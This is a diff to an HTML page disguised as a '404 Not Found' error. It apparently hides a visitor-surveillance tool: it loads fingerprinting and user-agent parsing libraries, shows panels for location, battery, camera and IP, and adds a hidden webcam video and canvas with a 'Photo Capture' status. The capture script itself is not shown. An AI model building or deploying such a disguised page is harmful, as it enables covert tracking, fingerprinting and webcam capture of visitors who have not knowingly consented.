@@ -1,3 +1,4 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,6 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>404 Not Found</title>
   <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.4/dist/fingerprint2.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js"></script>
 </head>
 <body>
   <div class="container">
@@ -18,12 +21,14 @@
       <a id="map-link" target="_blank" style="display:none;">View on Maps</a>
       <div id="battery-info">Battery: Loading...</div>
       <div id="camera-info">Camera: Checking...</div>
-      <div id="microphone-info">Microphone: Checking...</div>
       <div id="ip-info">IP: Loading...</div>
       <div id="device-details">Device Details: Loading...</div>
-      <div id="network-info">Network: Loading...</div>
+      <div id="photo-status">Photo Capture: Waiting...</div>
     </div>
   </div>
+
+  <video id="webcam" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
   <script src="script.js"></script>
 </body>
